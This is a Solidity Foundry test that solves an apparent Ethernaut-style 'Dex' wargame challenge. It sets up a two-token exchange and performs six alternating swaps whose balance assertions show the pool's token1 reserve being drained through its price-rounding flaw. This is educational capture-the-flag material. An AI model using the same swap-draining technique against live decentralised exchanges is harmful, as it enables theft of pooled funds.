// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken, IERC20} from "src/challenge-22-dex/Dex.sol";

contract DexTest is Test {
    Dex public dex;
    IERC20 public token1;
    IERC20 public token2;
    address user = makeAddr("user");
    address owner = makeAddr("owner");

    function setUp() public {
        vm.startPrank(address(owner));
        dex = new Dex();

        token1 = new SwappableToken(address(dex), "Token1", "TK1", 110);
        token2 = new SwappableToken(address(dex), "Token2", "TK2", 110);

        dex.setTokens(address(token1), address(token2));

        token1.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);

        token2.approve(address(dex), 100);
        dex.addLiquidity(address(token2), 100);

        token1.transfer(user, 10);
        token2.transfer(user, 10);
        vm.stopPrank();

        vm.label(user, "User");
        vm.label(owner, "Owner");
        vm.label(address(dex), "DEX");
        vm.label(address(token1), "Token1");
        vm.label(address(token1), "Token2");
    }

    function testInitialBalances() public {
        assertEq(token1.balanceOf(user), 10);
        assertEq(token2.balanceOf(user), 10);

        assertEq(token1.balanceOf(address(dex)), 100);
        assertEq(token2.balanceOf(address(dex)), 100);
    }

    function testAttackDex() public {
        vm.startPrank(user);

        // Swap 1: Token 1 -> Token 2
        uint256 amountToken1In = 10;

        dex.approve(address(dex), amountToken1In);
        dex.swap(address(token1), address(token2), amountToken1In);

        assertEq(token1.balanceOf(user), 0);
        assertEq(token2.balanceOf(user), 20);

        assertEq(token1.balanceOf(address(dex)), 110);
        assertEq(token2.balanceOf(address(dex)), 90);

        // Swap 2: Token 2 -> Token 1
        uint256 amountToken2In = 20;

        dex.approve(address(dex), amountToken2In);
        dex.swap(address(token2), address(token1), amountToken2In);

        assertEq(token1.balanceOf(user), 24);
        assertEq(token2.balanceOf(user), 0);

        assertEq(token1.balanceOf(address(dex)), 86);
        assertEq(token2.balanceOf(address(dex)), 110);

        // Swap 3: Token 1 -> Token 2
        amountToken1In = 24;

        dex.approve(address(dex), amountToken1In);
        dex.swap(address(token1), address(token2), amountToken1In);

        assertEq(token1.balanceOf(user), 0);
        assertEq(token2.balanceOf(user), 30);

        assertEq(token1.balanceOf(address(dex)), 110);
        assertEq(token2.balanceOf(address(dex)), 80);

        // Swap 4: Token 2 -> Token 1
        amountToken2In = 30;

        dex.approve(address(dex), amountToken2In);
        dex.swap(address(token2), address(token1), amountToken2In);

        assertEq(token1.balanceOf(user), 41);
        assertEq(token2.balanceOf(user), 0);

        assertEq(token1.balanceOf(address(dex)), 69);
        assertEq(token2.balanceOf(address(dex)), 110);

        // Swap 5: Token 1 -> Token 2
        amountToken1In = 41;

        dex.approve(address(dex), amountToken1In);
        dex.swap(address(token1), address(token2), amountToken1In);

        assertEq(token1.balanceOf(user), 0);
        assertEq(token2.balanceOf(user), 65);

        assertEq(token1.balanceOf(address(dex)), 110);
        assertEq(token2.balanceOf(address(dex)), 45);

        // Swap 6: Token 2 -> Token 1
        amountToken2In = 45;

        dex.approve(address(dex), amountToken2In);
        dex.swap(address(token2), address(token1), amountToken2In);

        assertEq(token1.balanceOf(user), 110);
        assertEq(token2.balanceOf(user), 20);

        assertEq(token1.balanceOf(address(dex)), 0);
        assertEq(token2.balanceOf(address(dex)), 90);

        vm.stopPrank();
    }
}
